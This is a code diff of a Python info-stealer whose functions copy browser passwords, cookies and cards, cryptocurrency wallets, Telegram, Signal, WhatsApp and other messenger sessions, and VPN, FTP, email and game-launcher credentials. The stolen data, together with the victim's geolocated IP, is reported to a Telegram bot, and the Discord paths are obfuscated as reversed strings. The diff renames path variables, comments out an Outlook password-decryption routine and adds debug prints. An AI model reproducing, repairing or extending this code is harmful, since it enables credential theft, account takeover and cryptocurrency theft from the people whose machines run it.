@@ -27,8 +27,8 @@ from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes # t
 from cryptography.hazmat.backends import default_backend # type: ignore
 
 
-TOKEN = '%TOKEN%'
-CHAT_ID = '%CHAT_ID%'
+TOKEN = '%token%'
+CHAT_ID = '%chatid%'
 
 
 def error_handler(error_message: str) -> None:
@@ -159,16 +159,16 @@ class get_data:
     async def list_profiles(self) -> None:
         try:
             directorys = {
-                "Brave": os.path.join(self.LocalAppData, "BraveSoftware", "Brave-Browser", "User Data"),
-                "Chrome": os.path.join(self.LocalAppData, "Google", "Chrome", "User Data"),
-                "Chromium": os.path.join(self.LocalAppData, "Chromium", "User Data"),
-                "Edge": os.path.join(self.LocalAppData, "Microsoft", "Edge", "User Data"),
-                "EpicPrivacy": os.path.join(self.LocalAppData, "Epic Privacy Browser", "User Data"),
-                "Iridium": os.path.join(self.LocalAppData, "Iridium", "User Data"),
-                "Opera": os.path.join(self.RoamingAppData, "Opera Software", "Opera Stable"),
-                "OperaGX": os.path.join(self.RoamingAppData, "Opera Software", "Opera GX Stable"),
-                "Vivaldi": os.path.join(self.LocalAppData, "Vivaldi", "User Data"),
-                "Yandex": os.path.join(self.LocalAppData, "Yandex", "YandexBrowser", "User Data")
+                "Brave": os.path.join(self.localappdata, "BraveSoftware", "Brave-Browser", "User Data"),
+                "Chrome": os.path.join(self.localappdata, "Google", "Chrome", "User Data"),
+                "Chromium": os.path.join(self.localappdata, "Chromium", "User Data"),
+                "Edge": os.path.join(self.localappdata, "Microsoft", "Edge", "User Data"),
+                "EpicPrivacy": os.path.join(self.localappdata, "Epic Privacy Browser", "User Data"),
+                "Iridium": os.path.join(self.localappdata, "Iridium", "User Data"),
+                "Opera": os.path.join(self.appdata, "Opera Software", "Opera Stable"),
+                "OperaGX": os.path.join(self.appdata, "Opera Software", "Opera GX Stable"),
+                "Vivaldi": os.path.join(self.localappdata, "Vivaldi", "User Data"),
+                "Yandex": os.path.join(self.localappdata, "Yandex", "YandexBrowser", "User Data")
             }
             for name, directory in directorys.items():
                 if os.path.isdir(directory):
@@ -340,15 +340,6 @@ class get_data:
                 except:pass  
         except Exception as e:
             error_handler(f"get autofills error - {str(e)}")
-
-
-
-
-
-
-
-
-
 
     async def StealRiotUser(self, cookie, browser: str) -> None:
         try:
@@ -744,44 +735,6 @@ class get_data:
         else:
             ListFonction.RobloxAccounts.append(f"Cookie: {cookie}\nBrowser: {browser}\nUser: {username} ({userId})\nThumbail: {thumbnail}\nRobux: {robux}\nPremium: {premium}\nCreation Date: {creationDate} / {days_passed} Days!\nDescription: {description}\nBanned: {banned}\nRAP: {rap}\nFriends List: \n{friendlist}\n==============================================\n")
             
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
     async def StealWallets(self, copied_path:str) -> None:
         try:
             wallets_ext_names = {
@@ -801,14 +754,14 @@ class get_data:
                 "Ronin": "bblmcdckkhkhfhhpfcchlpalebmonecp",
                 }
             wallet_local_paths = {
-                "Bitcoin": os.path.join(self.RoamingAppData, "Bitcoin", "wallets"),
-                "Bytecoin": os.path.join(self.RoamingAppData, "bytecoin"),
-                "Coinomi": os.path.join(self.LocalAppData, "Coinomi", "Coinomi", "wallets"),
-                "Atomic": os.path.join(self.RoamingAppData, "Atomic", "Local Storage", "leveldb"),
-                "Dash": os.path.join(self.RoamingAppData, "DashCore", "wallets"),
-                "Exodus": os.path.join(self.RoamingAppData, "Exodus", "exodus.wallet"),
-                "Electrum": os.path.join(self.RoamingAppData, "Electrum", "wallets"),
-                "WalletWasabi": os.path.join(self.RoamingAppData, "WalletWasabi", "Client", "Wallets"),
+                "Bitcoin": os.path.join(self.appdata, "Bitcoin", "wallets"),
+                "Bytecoin": os.path.join(self.appdata, "bytecoin"),
+                "Coinomi": os.path.join(self.localappdata, "Coinomi", "Coinomi", "wallets"),
+                "Atomic": os.path.join(self.appdata, "Atomic", "Local Storage", "leveldb"),
+                "Dash": os.path.join(self.appdata, "DashCore", "wallets"),
+                "Exodus": os.path.join(self.appdata, "Exodus", "exodus.wallet"),
+                "Electrum": os.path.join(self.appdata, "Electrum", "wallets"),
+                "WalletWasabi": os.path.join(self.appdata, "WalletWasabi", "Client", "Wallets"),
             }
             wallet_dir = os.path.join(copied_path, "Wallets")
             os.makedirs(wallet_dir, exist_ok=True)
@@ -840,7 +793,7 @@ class get_data:
 
     async def StealTelegramSession(self, directory_path: str) -> None:
         try:
-            tg_path = os.path.join(self.RoamingAppData, "Telegram Desktop", "tdata")
+            tg_path = os.path.join(self.appdata, "Telegram Desktop", "tdata")
             
             if os.path.exists(tg_path):
                 copy_path = os.path.join(directory_path, "Messenger", "Telegram Session")
@@ -877,7 +830,7 @@ class get_data:
             whatsapp_session = os.path.join(directory_path, "Messenger", "WhatsApp")
             os.makedirs(whatsapp_session, exist_ok=True)
             regex_pattern = re.compile(r"^[a-z0-9]+\.WhatsAppDesktop_[a-z0-9]+$", re.IGNORECASE)
-            parent_folders = [entry for entry in Path(self.LocalAppData, 'Packages').iterdir() if regex_pattern.match(entry.name)]
+            parent_folders = [entry for entry in Path(self.localappdata, 'Packages').iterdir() if regex_pattern.match(entry.name)]
 
             for parent in parent_folders:
                 local_state_folders = [entry for entry in parent.rglob("LocalState") if entry.is_dir()]
@@ -900,7 +853,7 @@ class get_data:
 
     async def StealSkype(self, directory_path: str) -> None:
         try:
-            skype_folder = os.path.join(self.RoamingAppData, "Microsoft", "Skype for Desktop", "Local Storage", "leveldb")
+            skype_folder = os.path.join(self.appdata, "Microsoft", "Skype for Desktop", "Local Storage", "leveldb")
             if os.path.exists(skype_folder):
                 copy_path = os.path.join(directory_path, "Messenger", "Skype")
                 os.makedirs(copy_path, exist_ok=True)
@@ -916,7 +869,7 @@ class get_data:
 
     async def StealSignal(self, directory_path: str) -> None:
         try:
-            signal_path = os.path.join(self.RoamingAppData, 'Signal')
+            signal_path = os.path.join(self.appdata, 'Signal')
             copied_path = os.path.join(directory_path, "Messenger", "Signal")
             if os.path.isdir(signal_path):
                 if not os.path.exists(copied_path):
@@ -941,7 +894,7 @@ class get_data:
     async def StealElement(self, directory_path: str) -> None:
         try:
             found_element = False
-            element_path = os.path.join(self.RoamingAppData, 'Element')
+            element_path = os.path.join(self.appdata, 'Element')
             copied_path = os.path.join(directory_path, "Messenger", "Element")
             if os.path.isdir(element_path):
                 if not os.path.exists(copied_path):
@@ -970,7 +923,7 @@ class get_data:
     async def StealViber(self, directory_path: str) -> None:
         try:
             found_viber = False
-            viber_path = os.path.join(self.RoamingAppData, 'ViberPC')
+            viber_path = os.path.join(self.appdata, 'ViberPC')
             copied_path = os.path.join(directory_path, "Messenger", "Viber")
             if os.path.isdir(viber_path):
                 if not os.path.exists(copied_path):
@@ -1003,7 +956,7 @@ class get_data:
 
     async def StealPidgin(self, directory_path: str) -> None:
         try:
-            pidgin_folder = os.path.join(self.RoamingAppData, '.purple', "accounts.xml")
+            pidgin_folder = os.path.join(self.appdata, '.purple', "accounts.xml")
             if os.path.exists(pidgin_folder):
                 pidgin_accounts = os.path.join(directory_path, "Messenger", "Pidgin")
                 os.makedirs(pidgin_accounts, exist_ok=True)
@@ -1019,7 +972,7 @@ class get_data:
 
     async def StealTox(self, directory_path: str) -> None:
         try:
-            tox_folder = os.path.join(self.RoamingAppData, 'Tox')
+            tox_folder = os.path.join(self.appdata, 'Tox')
             if os.path.isdir(tox_folder):
                 tox_session = os.path.join(directory_path, "Messenger", "Tox")
                 os.makedirs(tox_session, exist_ok=True)
@@ -1036,7 +989,7 @@ class get_data:
 
     async def StealProtonVPN(self, directory_path: str) -> None:
         try:
-            protonvpn_folder = os.path.join(self.LocalAppData, 'ProtonVPN')
+            protonvpn_folder = os.path.join(self.localappdata, 'ProtonVPN')
             if not os.path.isdir(protonvpn_folder):
                 return
             
@@ -1058,7 +1011,7 @@ class get_data:
 
     async def StealSurfsharkVPN(self, directory_path: str) -> None:
         try:
-            surfsharkvpn_folder = os.path.join(self.RoamingAppData, 'Surfshark')
+            surfsharkvpn_folder = os.path.join(self.appdata, 'Surfshark')
             if not os.path.isdir(surfsharkvpn_folder):
                 return
             
@@ -1175,7 +1128,7 @@ class get_data:
 
     async def BackupMailbird(self, directory_path: str) -> None:
         try:
-            mailbird_folder = os.path.join(self.LocalAppData, 'MailBird')
+            mailbird_folder = os.path.join(self.localappdata, 'MailBird')
             if not os.path.isdir(mailbird_folder):
                 return
             
@@ -1191,94 +1144,94 @@ class get_data:
             error_handler(f"backupmailbird error - {str(e)}")
             pass
 
-    async def DecryptOutlook(encrypted_value) -> None:
-        try:
-            encrypted_data = encrypted_value[1:]
-            blob_in = ctypes.windll.kernel32.LocalAlloc(0x40, len(encrypted_data))
-            ctypes.windll.kernel32.RtlMoveMemory(blob_in, bytes(encrypted_data), len(encrypted_data))
+    # async def DecryptOutlook(encrypted_value) -> None:
+    #     try:
+    #         encrypted_data = encrypted_value[1:]
+    #         blob_in = ctypes.windll.kernel32.LocalAlloc(0x40, len(encrypted_data))
+    #         ctypes.windll.kernel32.RtlMoveMemory(blob_in, bytes(encrypted_data), len(encrypted_data))
 
-            data_out = ctypes.c_void_p()
-            if ctypes.windll.crypt32.CryptUnprotectData(
-                ctypes.byref(ctypes.c_buffer(encrypted_data)), None, None, None, None, 0, ctypes.byref(data_out)):
-                decrypted_data = ctypes.cast(data_out, ctypes.POINTER(ctypes.c_ubyte))
-                length = ctypes.windll.kernel32.LocalSize(data_out)
-                return bytes(bytearray([decrypted_data[i] for i in range(length)])).decode("utf-8").replace("\x00", "")
-        except Exception as e:
-            error_handler(f"decrypt outlook error - {str(e)}")
-            return "null"
+    #         data_out = ctypes.c_void_p()
+    #         if ctypes.windll.crypt32.CryptUnprotectData(
+    #             ctypes.byref(ctypes.c_buffer(encrypted_data)), None, None, None, None, 0, ctypes.byref(data_out)):
+    #             decrypted_data = ctypes.cast(data_out, ctypes.POINTER(ctypes.c_ubyte))
+    #             length = ctypes.windll.kernel32.LocalSize(data_out)
+    #             return bytes(bytearray([decrypted_data[i] for i in range(length)])).decode("utf-8").replace("\x00", "")
+    #     except Exception as e:
+    #         error_handler(f"decrypt outlook error - {str(e)}")
+    #         return "null"
 
-    async def get_info_from_registry(self, path, value_name) -> None:
-        try:
-            registry_key = reg.OpenKey(reg.HKEY_CURRENT_USER, path, 0, reg.KEY_READ)
-            value, regtype = reg.QueryValueEx(registry_key, value_name)
-            reg.CloseKey(registry_key)
-            return value
-        except Exception as e:
-            error_handler(f"get info from registry error - {str(e)}")
-            return None
+    # async def get_info_from_registry(self, path, value_name) -> None:
+    #     try:
+    #         registry_key = reg.OpenKey(reg.HKEY_CURRENT_USER, path, 0, reg.KEY_READ)
+    #         value, regtype = reg.QueryValueEx(registry_key, value_name)
+    #         reg.CloseKey(registry_key)
+    #         return value
+    #     except Exception as e:
+    #         error_handler(f"get info from registry error - {str(e)}")
+    #         return None
 
-    async def StealOutlook(self, directory_path) -> None:
-        mail_client_regex = re.compile(r'^([a-zA-Z0-9_\-\.]+)@([a-zA-Z0-9_\-\.]+)\.([a-zA-Z]{2,5})$')
-        smtp_client_regex = re.compile(r'^(?!:\/\/)([a-zA-Z0-9-_]+\.)*[a-zA-Z0-9][a-zA-Z0-9-_]+\.[a-zA-Z]{2,11}?$')
+    # async def StealOutlook(self, directory_path) -> None:
+    #     mail_client_regex = re.compile(r'^([a-zA-Z0-9_\-\.]+)@([a-zA-Z0-9_\-\.]+)\.([a-zA-Z]{2,5})$')
+    #     smtp_client_regex = re.compile(r'^(?!:\/\/)([a-zA-Z0-9-_]+\.)*[a-zA-Z0-9][a-zA-Z0-9-_]+\.[a-zA-Z]{2,11}?$')
 
-        outlook_path = os.path.join(directory_path, "Email", 'OutlookMail')
+    #     outlook_path = os.path.join(directory_path, "Email", 'OutlookMail')
 
-        reg_directories = [
-            r"Software\Microsoft\Office\15.0\Outlook\Profiles\Outlook\9375CFF0413111d3B88A00104B2A6676",
-            r"Software\Microsoft\Office\16.0\Outlook\Profiles\Outlook\9375CFF0413111d3B88A00104B2A6676",
-            r"Software\Microsoft\Windows NT\CurrentVersion\Windows Messaging Subsystem\Profiles\Outlook\9375CFF0413111d3B88A00104B2A6676",
-            r"Software\Microsoft\Windows Messaging Subsystem\Profiles\9375CFF0413111d3B88A00104B2A6676"
-        ]
+    #     reg_directories = [
+    #         r"Software\Microsoft\Office\15.0\Outlook\Profiles\Outlook\9375CFF0413111d3B88A00104B2A6676",
+    #         r"Software\Microsoft\Office\16.0\Outlook\Profiles\Outlook\9375CFF0413111d3B88A00104B2A6676",
+    #         r"Software\Microsoft\Windows NT\CurrentVersion\Windows Messaging Subsystem\Profiles\Outlook\9375CFF0413111d3B88A00104B2A6676",
+    #         r"Software\Microsoft\Windows Messaging Subsystem\Profiles\9375CFF0413111d3B88A00104B2A6676"
+    #     ]
 
-        mail_clients = [
-            "SMTP Email Address", "SMTP Server", "POP3 Server", "POP3 User Name", "SMTP User Name", "NNTP Email Address",
-            "NNTP User Name", "NNTP Server", "IMAP Server", "IMAP User Name", "Email", "HTTP User", "HTTP Server URL",
-            "POP3 User", "IMAP User", "HTTPMail User Name", "HTTPMail Server", "SMTP User", "POP3 Password2",
-            "IMAP Password2", "NNTP Password2", "HTTPMail Password2", "SMTP Password2", "POP3 Password", "IMAP Password",
-            "NNTP Password", "HTTPMail Password", "SMTP Password",
-        ]
+    #     mail_clients = [
+    #         "SMTP Email Address", "SMTP Server", "POP3 Server", "POP3 User Name", "SMTP User Name", "NNTP Email Address",
+    #         "NNTP User Name", "NNTP Server", "IMAP Server", "IMAP User Name", "Email", "HTTP User", "HTTP Server URL",
+    #         "POP3 User", "IMAP User", "HTTPMail User Name", "HTTPMail Server", "SMTP User", "POP3 Password2",
+    #         "IMAP Password2", "NNTP Password2", "HTTPMail Password2", "SMTP Password2", "POP3 Password", "IMAP Password",
+    #         "NNTP Password", "HTTPMail Password", "SMTP Password",
+    #     ]
 
-        data = ""
-        for directory in reg_directories:
-            data += await self.get_data_from_registry(directory, mail_clients, mail_client_regex, smtp_client_regex)
+    #     data = ""
+    #     for directory in reg_directories:
+    #         data += await self.get_data_from_registry(directory, mail_clients, mail_client_regex, smtp_client_regex)
 
-        if data:
-            os.makedirs(outlook_path, exist_ok=True)
-            with open(os.path.join(outlook_path, "Outlook.txt"), "w") as file:
-                file.write(data + "\r\n")
+    #     if data:
+    #         os.makedirs(outlook_path, exist_ok=True)
+    #         with open(os.path.join(outlook_path, "Outlook.txt"), "w") as file:
+    #             file.write(data + "\r\n")
 
-    async def get_data_from_registry(self, path, clients, mail_client_regex, smtp_client_regex) -> None:
-        data = ""
-        try:
-            for client in clients:
-                try:
-                    value = await self.get_info_from_registry(path, client)
-                    if value and "Password" in client and "2" not in client:
-                        data += f"{client}: {await self.DecryptOutlook(value)}\r\n"
-                    elif value and (smtp_client_regex.match(value) or mail_client_regex.match(value)):
-                        data += f"{client}: {value}\r\n"
-                    elif value:
-                        decoded_value = value.decode("utf-8").replace("\x00", "")
-                        data += f"{client}: {decoded_value}\r\n"
-                except Exception as e:
-                    error_handler(f"get data from reg error - {str(e)}")
-                    pass
+    # async def get_data_from_registry(self, path, clients, mail_client_regex, smtp_client_regex) -> None:
+    #     data = ""
+    #     try:
+    #         for client in clients:
+    #             try:
+    #                 value = await self.get_info_from_registry(path, client)
+    #                 if value and "Password" in client and "2" not in client:
+    #                     data += f"{client}: {await self.DecryptOutlook(value)}\r\n"
+    #                 elif value and (smtp_client_regex.match(value) or mail_client_regex.match(value)):
+    #                     data += f"{client}: {value}\r\n"
+    #                 elif value:
+    #                     decoded_value = value.decode("utf-8").replace("\x00", "")
+    #                     data += f"{client}: {decoded_value}\r\n"
+    #             except Exception as e:
+    #                 error_handler(f"get data from reg error - {str(e)}")
+    #                 pass
 
-            with reg.OpenKey(reg.HKEY_CURRENT_USER, path) as key:
-                subkeys_count = reg.QueryInfoKey(key)[0]
-                for i in range(subkeys_count):
-                    subkey_name = reg.EnumKey(key, i)
-                    data += await self.get_data_from_registry(f"{path}\\{subkey_name}", clients, mail_client_regex, smtp_client_regex)
+    #         with reg.OpenKey(reg.HKEY_CURRENT_USER, path) as key:
+    #             subkeys_count = reg.QueryInfoKey(key)[0]
+    #             for i in range(subkeys_count):
+    #                 subkey_name = reg.EnumKey(key, i)
+    #                 data += await self.get_data_from_registry(f"{path}\\{subkey_name}", clients, mail_client_regex, smtp_client_regex)
 
-        except Exception as e:
-            error_handler(f"get data from registry error - {str(e)}")
-            pass
+    #     except Exception as e:
+    #         error_handler(f"get data from registry error - {str(e)}")
+    #         pass
 
-        return data
+    #     return data
 
     async def StealFileZilla(self, directory_path: str) -> None:
         try:
-            filezilla_folder = os.path.join(self.RoamingAppData, 'FileZilla')
+            filezilla_folder = os.path.join(self.appdata, 'FileZilla')
             if not os.path.isdir(filezilla_folder):
                 return
             
@@ -1442,16 +1395,16 @@ class get_data:
     async def StealPasswordManagers(self, directory_path: str) -> None:
         try:
             browser_paths = {
-                "Brave": os.path.join(self.LocalAppData, "BraveSoftware", "Brave-Browser", "User Data"),
-                "Chrome": os.path.join(self.LocalAppData, "Google", "Chrome", "User Data"),
-                "Chromium": os.path.join(self.LocalAppData, "Chromium", "User Data"),
-                "Edge": os.path.join(self.LocalAppData, "Microsoft", "Edge", "User Data"),
-                "EpicPrivacy": os.path.join(self.LocalAppData, "Epic Privacy Browser", "User Data"),
-                "Iridium": os.path.join(self.LocalAppData, "Iridium", "User Data"),
-                "Opera": os.path.join(self.RoamingAppData, "Opera Software", "Opera Stable"),
-                "OperaGX": os.path.join(self.RoamingAppData, "Opera Software", "Opera GX Stable"),
-                "Vivaldi": os.path.join(self.LocalAppData, "Vivaldi", "User Data"),
-                "Yandex": os.path.join(self.LocalAppData, "Yandex", "YandexBrowser", "User Data")
+                "Brave": os.path.join(self.localappdata, "BraveSoftware", "Brave-Browser", "User Data"),
+                "Chrome": os.path.join(self.localappdata, "Google", "Chrome", "User Data"),
+                "Chromium": os.path.join(self.localappdata, "Chromium", "User Data"),
+                "Edge": os.path.join(self.localappdata, "Microsoft", "Edge", "User Data"),
+                "EpicPrivacy": os.path.join(self.localappdata, "Epic Privacy Browser", "User Data"),
+                "Iridium": os.path.join(self.localappdata, "Iridium", "User Data"),
+                "Opera": os.path.join(self.appdata, "Opera Software", "Opera Stable"),
+                "OperaGX": os.path.join(self.appdata, "Opera Software", "Opera GX Stable"),
+                "Vivaldi": os.path.join(self.localappdata, "Vivaldi", "User Data"),
+                "Yandex": os.path.join(self.localappdata, "Yandex", "YandexBrowser", "User Data")
             }
 
             password_mgr_dirs = {
@@ -1865,14 +1818,14 @@ class get_data:
                     error_handler(f"get discord error - {str(e)}")
 
             browserPaths = [        
-                [f"{self.RoamingAppData}/Opera Software/Opera GX Stable", "opera.exe", "/Local Storage/leveldb", "/", "/Network", "/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn" ],
-                [f"{self.RoamingAppData}/Opera Software/Opera Stable", "opera.exe", "/Local Storage/leveldb", "/", "/Network", "/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn" ],
-                [f"{self.RoamingAppData}/Opera Software/Opera Neon/User Data/Default", "opera.exe", "/Local Storage/leveldb", "/", "/Network", "/Local Extension Settings/nkbihfbeogaeaoehlefnknn" ],
-                [f"{self.LocalAppData}/Google/Chrome/User Data", f"Chrome.exe", "/Default/Local Storage/leveldb", "/Default", "/Default/Network", "/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn" ],
-                [f"{self.LocalAppData}/Google/Chrome SxS/User Data", f"Chrome.exe", "/Default/Local Storage/leveldb", "/Default", "/Default/Network", "/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn" ],
-                [f"{self.LocalAppData}/BraveSoftware/Brave-Browser/User Data", "brave.exe", "/Default/Local Storage/leveldb", "/Default", "/Default/Network", "/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn" ],
-                [f"{self.LocalAppData}/Yandex/YandexBrowser/User Data", "yandex.exe", "/Default/Local Storage/leveldb", "/Default", "/Default/Network", "/HougaBouga/nkbihfbeogaeaoehlefnkodbefgpgknn" ],
-                [f"{self.LocalAppData}/Microsoft/Edge/User Data", "edge.exe", "/Default/Local Storage/leveldb", "/Default", "/Default/Network", "/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn" ]
+                [f"{self.appdata}/Opera Software/Opera GX Stable", "opera.exe", "/Local Storage/leveldb", "/", "/Network", "/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn" ],
+                [f"{self.appdata}/Opera Software/Opera Stable", "opera.exe", "/Local Storage/leveldb", "/", "/Network", "/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn" ],
+                [f"{self.appdata}/Opera Software/Opera Neon/User Data/Default", "opera.exe", "/Local Storage/leveldb", "/", "/Network", "/Local Extension Settings/nkbihfbeogaeaoehlefnknn" ],
+                [f"{self.localappdata}/Google/Chrome/User Data", f"Chrome.exe", "/Default/Local Storage/leveldb", "/Default", "/Default/Network", "/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn" ],
+                [f"{self.localappdata}/Google/Chrome SxS/User Data", f"Chrome.exe", "/Default/Local Storage/leveldb", "/Default", "/Default/Network", "/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn" ],
+                [f"{self.localappdata}/BraveSoftware/Brave-Browser/User Data", "brave.exe", "/Default/Local Storage/leveldb", "/Default", "/Default/Network", "/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn" ],
+                [f"{self.localappdata}/Yandex/YandexBrowser/User Data", "yandex.exe", "/Default/Local Storage/leveldb", "/Default", "/Default/Network", "/HougaBouga/nkbihfbeogaeaoehlefnkodbefgpgknn" ],
+                [f"{self.localappdata}/Microsoft/Edge/User Data", "edge.exe", "/Default/Local Storage/leveldb", "/Default", "/Default/Network", "/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn" ]
             ]
 
             Discord = 'drocsiD'
@@ -1881,10 +1834,10 @@ class get_data:
             Canary = 'yranacdrocsid'
 
             discordPaths = [        
-                [f"{self.RoamingAppData}/{Discord[::-1]}", "/Local Storage/leveldb"],
-                [f"{self.RoamingAppData}/{Lightcord[::-1]}", "/Local Storage/leveldb"],
-                [f"{self.RoamingAppData}/{Canary[::-1]}", "/Local Storage/leveldb"],
-                [f"{self.RoamingAppData}/{BTPdiscord[::-1]}", "/Local Storage/leveldb"],
+                [f"{self.appdata}/{Discord[::-1]}", "/Local Storage/leveldb"],
+                [f"{self.appdata}/{Lightcord[::-1]}", "/Local Storage/leveldb"],
+                [f"{self.appdata}/{Canary[::-1]}", "/Local Storage/leveldb"],
+                [f"{self.appdata}/{BTPdiscord[::-1]}", "/Local Storage/leveldb"],
             ]                    
 
             try:
@@ -1952,7 +1905,7 @@ class get_data:
 
     async def StealUbisoft(self, directory_path: str) -> None:
         try:
-            ubisoft_path = os.path.join(self.LocalAppData, "Ubisoft Game Launcher")
+            ubisoft_path = os.path.join(self.localappdata, "Ubisoft Game Launcher")
             copied_path = os.path.join(directory_path, "Games", "Uplay")
             if os.path.isdir(ubisoft_path):
                 if not os.path.exists(copied_path):
@@ -1969,7 +1922,7 @@ class get_data:
 
     async def StealEpicGames(self, directory_path: str) -> None:
         try:
-            epic_path = os.path.join(self.LocalAppData, "EpicGamesLauncher", "Saved", "Config", "Windows")
+            epic_path = os.path.join(self.localappdata, "EpicGamesLauncher", "Saved", "Config", "Windows")
             copied_path = os.path.join(directory_path, "Games", "Epic Games")
             if os.path.isdir(epic_path):
                 if not os.path.exists(copied_path):
@@ -1985,7 +1938,7 @@ class get_data:
 
     async def StealGrowtopia(self, directory_path: str) -> None:
         try:
-            growtopia_path = os.path.join(self.LocalAppData, "Growtopia", "save.dat")
+            growtopia_path = os.path.join(self.localappdata, "Growtopia", "save.dat")
             copied_path = os.path.join(directory_path, "Games", "Growtopia")
             if os.path.isfile(growtopia_path):
                 shutil.copy(growtopia_path, os.path.join(copied_path, "save.dat"))
@@ -2166,6 +2119,7 @@ class get_data:
             if len(os.listdir(os.path.join(filePath, "Sessions"))) == 0:
                 try:shutil.rmtree(os.path.join(filePath, "Sessions"))
                 except:pass
+            
 
             tasks = [
                 self.StealWallets(filePath),
@@ -2195,7 +2149,7 @@ class get_data:
                 # BackupMail
                 self.BackupMailbird(filePath),
                 self.BackupThunderbird(filePath),
-                self.StealOutlook(filePath),
+                # self.StealOutlook(filePath),
 
                 # Password Manager
                 self.StealPasswordManagers(filePath),
@@ -2207,9 +2161,7 @@ class get_data:
                 self.StealSteamFiles(filePath),
                 self.StealBattleNet(filePath),
             ]
-            
             await asyncio.gather(*tasks)
-
             count_folders_in = {
                 "Messenger": len(os.listdir(os.path.join(filePath, "Messenger"))),
                 "VPN": len(os.listdir(os.path.join(filePath, "VPN"))),
@@ -2227,13 +2179,13 @@ class get_data:
             ListFonction.FtpClient.append(str(count_folders_in["FTP Clients"]))
             ListFonction.GamesCounts.append(str(count_folders_in["Games"]))
             ListFonction.PasswordManager.append(str(count_folders_in["PasswordManager"]))
-            
             folders_to_check = ["Messenger", "VPN", "Email", "Wallets", "FTP Clients", "Games", "Password Managers"]
             
             for folder in folders_to_check:
                 try:
                     if len(os.listdir(os.path.join(filePath, folder))) == 0:
                         shutil.rmtree(os.path.join(filePath, folder))
+                        print("shutil.rmtree(os.path.join(filePath, folder))")
                 except Exception as e:
                     error_handler(f"remove empty folder error - {str(e)}")
 
@@ -2243,11 +2195,12 @@ class get_data:
 
     async def SendKeyWords(self) -> None:
         try:
+            print("SendKeyWords")
             cookies = []
             passwords = []
             autofills = []
             
-            words = ["keyword_example.com"] 
+            words = ["keyword_example.com", "another_example.net"] 
 
             for word in words:
                 found_autofill = any(word in autofill for autofill in ListFonction.Autofills)
@@ -2260,7 +2213,6 @@ class get_data:
                     passwords.append(word)
                 if found_autofill: 
                     autofills.append(word)
-
             text = f"<b>📚 <i><u>{platform.node()} - Keywords Results</u></i></b>\n\n"
             if cookies: 
                 text += f"<b>Cookies:</b>\n<code>{', '.join(cookies if cookies else None)}</code>\n"
@@ -2275,11 +2227,9 @@ class get_data:
                 'text': text,
                 'parse_mode': 'HTML'
             }
-            
             async with aiohttp.ClientSession() as session:
                 async with session.post(send, data=message_payload) as response:
                     pass
-
         except Exception as e:
             error_handler(f"send keywords error - {str(e)}")
 
@@ -2291,62 +2241,60 @@ class get_data:
             shutil.make_archive(filePath, "zip", filePath)
             system_info = platform.uname()
 
-            ip_info_url = "https://ipinfo.io/json"
-            ip_info_response = requests.get(ip_info_url)
-            ip_info_data = ip_info_response.json()
+            url = "https://ipinfo.io/json"
+            resp = requests.get(url)
+            data = resp.json()
 
-            public_ip = ip_info_data.get("ip")
-            region = ip_info_data.get("region")
-            country = ip_info_data.get("country")
-            location = ip_info_data.get("loc", "").split(",")
+            ipaddress = data.get("ip")
+            region = data.get("region")
+            country = data.get("country")
+            location = data.get("loc", "").split(",")
             latitude = location[0] if len(location) > 0 else "Unknown"
             longitude = location[1] if len(location) > 1 else "Unknown"
             google_maps_link = f"https://www.google.com/maps?q={latitude},{longitude}"
 
-
-            text += f"""
+            text = f"""
 <b>👤  <i><u>{hostname} - All Info</u></i></b>
 
 <b><i><u>System Info</u></i></b>
 
-<b>Computer Name:</b>\t<code>{system_info.node}</code>
-<b>Computer Hostname:</b>\t<code>{hostname}</code>
-<b>Computer OS:</b>\t<code>{system_info.system} {system_info.release} {system_info.version}</code>
-<b>Total Memory:</b>\t<code>{system_info.machine}</code>
-<b>CPU:</b>\t<code>{system_info.processor}</code>
+<b>Computer Host:</b> <code>{system_info.node}</code>
+<b>Computer OS:</b> <code>{system_info.system} {system_info.release} {system_info.version}</code>
+<b>Total Memory:</b> <code>{system_info.machine}</code>
+<b>CPU:</b> <code>{system_info.processor}</code>
 
 <b><i><u>IP Info</u></i></b>
-<b>IP Address:</b>\t<code>{public_ip}</code>
-<b>Region:</b>\t<code>{region}</code>
-<b>Country:</b>\t<code>{country}</code>
-<b>Google Maps Location:</b>\t<a href="{google_maps_link}">View on Google Maps</a>
+<b>IP Address:</b> <code>{ipaddress}</code>
+<b>Region:</b> <code>{region}</code>
+<b>Country:</b> <code>{country}</code>
+<b>Location:</b> <a href="{google_maps_link}">View on Google Maps</a>
 
 <b><i><u>Browser</u></i></b>
-<b>Cards:</b>\t<code>{str(len(ListFonction.Cards))}</code>
-<b>Passwords:</b>\t<code>{str(len(ListFonction.Passwords))}</code>
-<b>Cookies:</b>\t<code>{str(len(ListFonction.Cookies))}</code>
-<b>Autofills:</b>\t<code>{str(len(ListFonction.Autofills))}</code>
+<b>Cards:</b> <code>{str(len(ListFonction.Cards))}</code>
+<b>Passwords:</b> <code>{str(len(ListFonction.Passwords))}</code>
+<b>Cookies:</b> <code>{str(len(ListFonction.Cookies))}</code>
+<b>Autofills:</b> <code>{str(len(ListFonction.Autofills))}</code>
 
 <b><i><u>Social Media</u></i></b>
-<b>Reddit:</b>\t<code>{str(len(ListFonction.RedditAccounts))}</code>
-<b>Instagram:</b>\t<code>{str(len(ListFonction.InstagramAccounts))}</code>
-<b>Guilded:</b>\t<code>{str(len(ListFonction.GuildedAccounts))}</code>
-<b>Patreon:</b>\t<code>{str(len(ListFonction.PatreonAccounts))}</code>
-<b>Spotify:</b>\t<code>{str(len(ListFonction.SpotifyAccount))}</code>
-<b>Twitch:</b>\t<code>{str(len(ListFonction.TwitchAccounts))}</code>
